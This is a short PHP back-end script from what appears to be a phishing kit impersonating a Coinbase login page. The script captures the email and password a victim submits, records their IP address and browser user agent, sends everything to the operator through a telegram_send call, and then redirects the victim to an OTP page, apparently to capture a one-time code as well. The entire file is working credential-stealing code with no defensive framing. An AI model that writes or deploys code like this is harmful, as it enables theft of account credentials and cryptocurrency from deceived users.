<?php

include 'settings.php';
$ai = $_POST['email'];
$pr = $_POST['password'];

if ($ai != null && $pr != null)
{

   


        $ip = getenv("REMOTE_ADDR");
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "|----------| COINBASE LOGIN |--------------|\n";
        $message .= "email    : " . $ai . "\n";
        $message .= "Passcode    : " . $pr . "\n";
        $message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $message .= "|-----------  --------------|\n";
        $subject = "COINBASE LOGIN : $ai|$ip";
       

telegram_send(urlencode($message));    

        header("Location: ../otp");
    

}

?>
